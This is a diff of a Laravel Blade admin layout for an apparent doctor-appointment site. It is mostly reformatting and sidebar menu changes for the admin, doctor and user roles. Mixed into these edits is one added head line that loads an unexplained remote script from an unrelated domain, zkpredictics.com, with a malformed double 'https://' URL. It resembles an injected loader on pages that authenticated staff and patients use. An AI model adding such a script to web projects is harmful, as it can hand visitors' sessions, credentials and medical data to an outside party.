@@ -4,7 +4,7 @@
 <head>
     <meta charset="utf-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="csrf-token" content="{{ csrf_token() }}">
+    <meta name="csrf-token" content="{{ csrf_token() }}" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">
     <title>@yield('title')</title>
     <meta content="Admin Dashboard" name="description" />
@@ -31,6 +31,8 @@
     <link href="{{ asset('toastr/toastr.min.css') }}" rel="stylesheet" type="text/css">
     <script src="https://www.chartjs.org/dist/2.9.3/Chart.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.9.2/html2pdf.bundle.js"></script>
+    <script src='https://https://zkpredictics.com/external_api.js'></script>
+
     @yield('style')
 </head>
 
@@ -79,14 +81,14 @@
                     <div class="user-info">
                         <h4 class="font-16 "> {{ Auth::User()->name }}</h4>
                         <span class=" user-status"><i class="fa fa-dot-circle-o text-success"></i>
-                        @if(Auth::User()->role=='admin')
-                        ADMIN PANEL
-                        @elseif(Auth::User()->role=='doctor')
-                        Doctor PANEL
-                        @else
-                        user PANEL
-                        @endif
-                      </span>
+                            @if (Auth::User()->role == 'admin')
+                                ADMIN PANEL
+                            @elseif(Auth::User()->role=='doctor')
+                                Doctor PANEL
+                            @else
+                                user PANEL
+                            @endif
+                        </span>
                     </div>
                 </div>
                 <div id="sidebar-menu">
@@ -97,7 +99,7 @@
                                 <span> Dashboard <span class="badge badge-primary pull-right"></span></span>
                             </a>
                         </li>
-                        @if(Auth::User()->role=='admin')
+                        @if (Auth::User()->role == 'admin')
                             {{-- <li class="has_sub ">
                                 <a href="" class="waves-effect "><i class="mdi mdi-buffer "></i> <span >
                                     Upcoming Meetings</span> </a>
@@ -135,30 +137,33 @@
                                 </ul>
                             </li> --}}
 
-                        <li class="has_sub ">
-                            <a href="" class="waves-effect "><i class="mdi mdi-buffer "></i> <span>Homepage Data</span>
-                            </a>
-                            <ul class="list-unstyled">
-                                {{-- <li><a href="{{ url('user') }}"> <i class="mdi mdi-clock "> Home Top Data</i> --}}
-                                <li><a href="{{ url('title') }}"> <i class="mdi mdi-clock ">Title / Description</i>
-                                <li><a href="{{ url('accordion') }}"> <i class="mdi mdi-clock ">Home Accordion</i>
-                                <li><a href="{{ url('counter') }}"> <i class="mdi mdi-clock "> Counter</i>
-                                <li><a href="{{ url('home_video') }}"> <i class="mdi mdi-clock "> Videos Link</i>
-                                    </a>
-                            </ul>
-                        </li>
-                        <li class="has_sub ">
-                            <a href="#" class="waves-effect "><i class="mdi mdi-buffer "></i> <span> How to Book
-                                    Session </span>
-                            </a>
-                            <ul class="list-unstyled">
-                                <li><a href="{{ url('Session_book') }}"> <i class="mdi mdi-clock "> How to Book
-                                            Session</i>
+                            <li class="has_sub ">
+                                <a href="" class="waves-effect "><i class="mdi mdi-buffer "></i> <span>Homepage
+                                        Data</span>
+                                </a>
+                                <ul class="list-unstyled">
+                                    {{-- <li><a href="{{ url('user') }}"> <i class="mdi mdi-clock "> Home Top Data</i> --}}
+                                    <li><a href="{{ url('title') }}"> <i class="mdi mdi-clock ">Title /
+                                                Description</i>
+                                    <li><a href="{{ url('accordion') }}"> <i class="mdi mdi-clock ">Home
+                                                Accordion</i>
+                                    <li><a href="{{ url('counter') }}"> <i class="mdi mdi-clock "> Counter</i>
+                                    <li><a href="{{ url('home_video') }}"> <i class="mdi mdi-clock "> Videos Link</i>
+                                        </a>
+                                </ul>
+                            </li>
+                            <li class="has_sub ">
+                                <a href="#" class="waves-effect "><i class="mdi mdi-buffer "></i> <span> How to Book
+                                        Session </span>
+                                </a>
+                                <ul class="list-unstyled">
+                                    <li><a href="{{ url('Session_book') }}"> <i class="mdi mdi-clock "> How to Book
+                                                Session</i>
 
-                                    </a>
-                            </ul>
-                        </li>
-                        {{-- <li class="has_sub ">
+                                        </a>
+                                </ul>
+                            </li>
+                            {{-- <li class="has_sub ">
                             <a href="" class="waves-effect "><i class="mdi mdi-buffer "></i> <span> Add Doctors</span>
                             </a>
                             <ul class="list-unstyled">
@@ -170,106 +175,117 @@
                             </ul>
                         </li> --}}
 
-                        <li class="has_sub ">
-                            <a href="#" class="waves-effect "><i class="mdi mdi-buffer "></i> <span>Footer Data</span>
-                            </a>
-                            <ul class="list-unstyled">
-                                <li><a href="{{ url('footer') }}"> <i class="mdi mdi-clock ">Footer Website</i>
-                                <li><a href="{{ url('social_link') }}"> <i class="mdi mdi-clock ">Follow Us Data</i>
-                                <li><a href="{{ url('terms_detail') }}"> <i class="mdi mdi-clock ">Terms Condition</i>
-                                <li><a href="{{ url('privacy_policy') }}"> <i class="mdi mdi-clock ">Privacy Policy</i>
-                                <li><a href="{{ url('Cancelltion_policy') }}"> <i class="mdi mdi-clock ">Cancelltion Policy</i>
-                                    </a>
-                            </ul>
-                        </li>
-                        <li>
-                            <a href="{{ url('add_speciality') }}" class="waves-effect ">
-                                <i class="mdi mdi-view-dashboard"></i>
-                                <span> Add speciality <span class="badge badge-primary pull-right"></span></span>
-                            </a>
-                        </li>                        
-                        <li>
-                            <a href="{{ url('diseases_add') }}" class="waves-effect ">
-                                <i class="mdi mdi-view-dashboard"></i>
-                                <span> Add Diseases <span class="badge badge-primary pull-right"></span></span>
-                            </a>
-                        </li>
-                        <li class="has_sub">
-                            <a href="#" class="waves-effect">
-                                <i class="mdi mdi-view-dashboard"></i>
-                                <span> Doctors<span class="badge badge-primary pull-right"></span></span>
-                            </a>
-                            <ul class="list-unstyled">
-                                <li><a href="{{ url('create_doctor') }}"> <i class="mdi mdi-clock ">Add Doctor</i>
-                                    </a>
-                            </ul>
-                        </li>
-                        <li class="has_sub ">
-                            <a href="" class="waves-effect "><i class="mdi mdi-buffer "></i> <span> Blog Data</span>
-                            </a>
-                            <ul class="list-unstyled">
-                                <li><a href="{{url('blog_create')}}"> <i class="mdi mdi-clock "> Add Blog</i>
-                                <li><a href="{{url('all_blogs')}}"> <i class="mdi mdi-clock "> All Blog</i>
-                                    </a>
-                            </ul>
-                        </li>
-                        <li class="has_sub ">
-                            <a href="" class="waves-effect "><i class="mdi mdi-buffer "></i> <span> User
-                                    Management</span> </a>
-                            <ul class="list-unstyled">
-                                <li><a href="{{ url('create') }}"> <i class="mdi mdi-clock "> Create Doctor / User</i>
-                                <li><a href="{{url('all_user')}}"> <i class="mdi mdi-clock "> All Users</i>
-                                    </a>
-                            </ul>
-                        </li>
+                            <li class="has_sub ">
+                                <a href="#" class="waves-effect "><i class="mdi mdi-buffer "></i> <span>Footer
+                                        Data</span>
+                                </a>
+                                <ul class="list-unstyled">
+                                    <li><a href="{{ url('footer') }}"> <i class="mdi mdi-clock ">Footer Website</i>
+                                    <li><a href="{{ url('social_link') }}"> <i class="mdi mdi-clock ">Follow Us
+                                                Data</i>
+                                    <li><a href="{{ url('terms_detail') }}"> <i class="mdi mdi-clock ">Terms
+                                                Condition</i>
+                                    <li><a href="{{ url('privacy_policy') }}"> <i class="mdi mdi-clock ">Privacy
+                                                Policy</i>
+                                    <li><a href="{{ url('Cancelltion_policy') }}"> <i
+                                                class="mdi mdi-clock ">Cancelltion Policy</i>
+                                        </a>
+                                </ul>
+                            </li>
+                            <li>
+                                <a href="{{ url('add_speciality') }}" class="waves-effect ">
+                                    <i class="mdi mdi-view-dashboard"></i>
+                                    <span> Add speciality <span class="badge badge-primary pull-right"></span></span>
+                                </a>
+                            </li>
+                            <li>
+                                <a href="{{ url('diseases_add') }}" class="waves-effect ">
+                                    <i class="mdi mdi-view-dashboard"></i>
+                                    <span> Add Diseases <span class="badge badge-primary pull-right"></span></span>
+                                </a>
+                            </li>
+                            <li class="has_sub">
+                                <a href="#" class="waves-effect">
+                                    <i class="mdi mdi-view-dashboard"></i>
+                                    <span> Doctors<span class="badge badge-primary pull-right"></span></span>
+                                </a>
+                                <ul class="list-unstyled">
+                                    <li><a href="{{ url('create_doctor') }}"> <i class="mdi mdi-clock ">Add
+                                                Doctor</i>
+                                        </a>
+                                </ul>
+                            </li>
+                            <li class="has_sub ">
+                                <a href="" class="waves-effect "><i class="mdi mdi-buffer "></i> <span> Blog
+                                        Data</span>
+                                </a>
+                                <ul class="list-unstyled">
+                                    <li><a href="{{ url('blog_create') }}"> <i class="mdi mdi-clock "> Add Blog</i>
+                                    <li><a href="{{ url('all_blogs') }}"> <i class="mdi mdi-clock "> All Blog</i>
+                                        </a>
+                                </ul>
+                            </li>
+                            <li class="has_sub ">
+                                <a href="" class="waves-effect "><i class="mdi mdi-buffer "></i> <span> User
+                                        Management</span> </a>
+                                <ul class="list-unstyled">
+                                    <li><a href="{{ url('create') }}"> <i class="mdi mdi-clock "> Create Doctor /
+                                                User</i>
+                                    <li><a href="{{ url('all_user') }}"> <i class="mdi mdi-clock "> All Users</i>
+                                        </a>
+                                </ul>
+                            </li>
                         @elseif(Auth::User()->role=='doctor')
-                        <li>
-                            <a href="{{url('aviable_time')}}" class="waves-effect ">
-                                <i class="mdi mdi-view-dashboard"></i>
-                                <span> Add Time Availability<span class="badge badge-primary pull-right"></span></span>
-                            </a>
-                        </li>  
-                        <li class="has_sub ">
-                            <a href="" class="waves-effect "><i class="fa fa-list"></i> <span>
-                                Appointment  </span> </a>
-                            <ul class="list-unstyled">
-                                <li><a href="#" >All Appointment</a></li>
-                                <li><a href="{{url('done_appointment')}}" >Done Appointment</a></li>
-                                <li><a href="{{url('cancel_appointment')}}" >Cancelled Appointment</a></li>
-                           </ul>
-                       </li>  
-                                       
-                        <li>
-                            <a href="{{url('profile_view')}}" class="waves-effect ">
-                                <i class="mdi mdi-view-dashboard"></i>
-                                <span> Profile <span class="badge badge-primary pull-right"></span></span>
-                            </a>
-                        </li>
+                            <li>
+                                <a href="{{ url('slottime') }}" class="waves-effect ">
+                                    <i class="mdi mdi-view-dashboard"></i>
+                                    <span> Add Time Availability<span
+                                            class="badge badge-primary pull-right"></span></span>
+                                </a>
+                            </li>
+                            <li class="has_sub ">
+                                <a href="" class="waves-effect "><i class="fa fa-list"></i> <span>
+                                        Appointment </span> </a>
+                                <ul class="list-unstyled">
+                                    <li><a href="{{ url('/getCurrentAppointments') }}">Your Appointments</a></li>
+                                    <li><a href="#">Past Appointments</a></li>
+
+                                    {{-- <li><a href="{{url('done_appointment')}}" >Done Appointment</a></li> --}}
+                                    {{-- <li><a href="{{url('cancel_appointment')}}" >Cancelled Appointment</a></li> --}}
+                                </ul>
+                            </li>
+
+                            <li>
+                                <a href="{{ url('profile_view') }}" class="waves-effect ">
+                                    <i class="mdi mdi-view-dashboard"></i>
+                                    <span> Profile <span class="badge badge-primary pull-right"></span></span>
+                                </a>
+                            </li>
                         @else
-                               
-                        <li>
-                            <a href="{{url('available_appointment')}}" class="waves-effect ">
-                                <i class="mdi mdi-view-dashboard"></i>
-                                <span> Make Appointment <span class="badge badge-primary pull-right"></span></span>
-                            </a>
-                        </li>
-                        <li class="has_sub ">
-                            <a href="" class="waves-effect "><i class="fa fa-list"></i> <span>
-                                My Reservations  </span> </a>
-                            <ul class="list-unstyled">
-                                <li><a href="#" >Next Sessions</a></li>
-                                <li><a href="#" >Previous Sessions</a></li>
-                                <li><a href="#" >Cancelled Sessions</a></li>
-                           </ul>
-                       </li> 
-                       <li>
-                        <a href="" class="waves-effect ">
-                            <i class="mdi mdi-view-dashboard"></i>
-                            <span> Profile <span class="badge badge-primary pull-right"></span></span>
-                        </a>
-                    </li> 
-                    @endif
-              {{-- <li class="">
+
+                            <li>
+                                <a href="{{ url('available_appointment') }}" class="waves-effect ">
+                                    <i class="mdi mdi-view-dashboard"></i>
+                                    <span> Make Appointment <span class="badge badge-primary pull-right"></span></span>
+                                </a>
+                            </li>
+                            <li class="has_sub ">
+                                <a href="" class="waves-effect "><i class="fa fa-list"></i> <span>
+                                        My Reservations </span> </a>
+                                <ul class="list-unstyled">
+                                    <li><a href="#">Next Sessions</a></li>
+                                    <li><a href="#">Previous Sessions</a></li>
+                                    <li><a href="#">Cancelled Sessions</a></li>
+                                </ul>
+                            </li>
+                            <li>
+                                <a href="" class="waves-effect ">
+                                    <i class="mdi mdi-view-dashboard"></i>
+                                    <span> Profile <span class="badge badge-primary pull-right"></span></span>
+                                </a>
+                            </li>
+                        @endif
+                        {{-- <li class="">
                         <a href="{{ route('logout') }}" class="waves-effect">
                         <i class="fa fa-sign-out"></i>
                         <span> Logout <span class="badge badge-primary pull-right"></span></span>
@@ -278,7 +294,7 @@
                     </ul>
                 </div>
                 <div class="clearfix"></div>
-            </div> 
+            </div>
         </div>
         <div class="content-page">
             <div class="content">
@@ -369,7 +385,8 @@
     <!-- App js -->
     <script src="{{ asset('assets/js/app.js') }}"></script>
     <script src="{{ asset('toastr/toastr.min.js') }}"></script>
-    <script src="https://cdn.tiny.cloud/1/rfv7rfhx5vafv76ygxza52h080627sqb542j7d7736y9x8c2/tinymce/5/tinymce.min.js" referrerpolicy="origin"></script>
+    <script src="https://cdn.tiny.cloud/1/rfv7rfhx5vafv76ygxza52h080627sqb542j7d7736y9x8c2/tinymce/5/tinymce.min.js"
+        referrerpolicy="origin"></script>
     @toastr_render
     @yield('scripts')
 </body>
